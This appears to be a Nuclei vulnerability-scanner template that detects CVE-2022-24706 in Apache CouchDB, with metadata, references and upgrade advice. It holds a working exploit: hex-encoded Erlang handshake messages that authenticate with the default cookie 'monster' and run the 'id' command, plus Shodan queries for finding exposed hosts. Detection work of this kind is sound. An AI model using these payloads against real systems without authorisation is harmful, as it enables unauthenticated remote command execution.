id: CVE-2022-24706
info:
  author: Mzack9999,pussycat0x
  classification:
    cpe: cpe:2.3:a:apache:couchdb:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-24706
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-1188
    epss-percentile: 0.9997
    epss-score: 0.94392
  description: 'In Apache CouchDB prior to 3.2.2, an attacker can access an improperly
    secured default installation without authenticating and gain admin privileges.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary commands on the affected system.

    '
  metadata:
    max-request: 2
    product: couchdb
    shodan-query:
    - product:"CouchDB"
    - product:"couchdb"
    - cpe:"cpe:2.3:a:apache:couchdb"
    vendor: apache
    verified: 'true'
  name: CouchDB Erlang Distribution - Remote Command Execution
  reference:
  - https://www.exploit-db.com/exploits/50914
  - https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit/blob/main/CVE-2022-24706-Exploit.py
  - https://nvd.nist.gov/vuln/detail/CVE-2022-24706
  - http://www.openwall.com/lists/oss-security/2022/04/26/1
  - http://www.openwall.com/lists/oss-security/2022/05/09/1
  remediation: 'Upgrade to versions 3.2.2 or newer. Starting from CouchDB 3.2.2, the
    previous default Erlang cookie value "monster" will be rejected upon startup.
    Upgraded installations will be required to select an alternative value.

    '
  severity: critical
  tags: cve2022,network,cve,couch,rce,kev,couchdb,apache,tcp,vkev,vuln
tcp:
- host:
  - '{{Hostname}}'
  - '{{Host}}:9100'
  inputs:
  - data: '{{name_msg}}'
    read: 1024
    type: hex
  - name: challenge
    read: 1024
  - data: '{{challenge_reply+md5(cookie + to_string(unpack(''>I'',substr(challenge,
      9, 13))))}}'
    type: hex
  - data: '{{cmd}}'
    read: 1024
    type: hex
  matchers:
  - condition: and
    part: raw
    type: word
    words:
    - uid
    - gid
    - groups
variables:
  challenge_reply: '00157201020304'
  cmd: 0000006670836804610667770e41414141414140414141414141410000000300000000007700770372657883680267770e41414141414140414141414141410000000300000000006805770463616c6c77026f737703636d646c000000016b000269646a770475736572
  cookie: monster
  name_msg: 00156e00050007499c4141414141414041414141414141
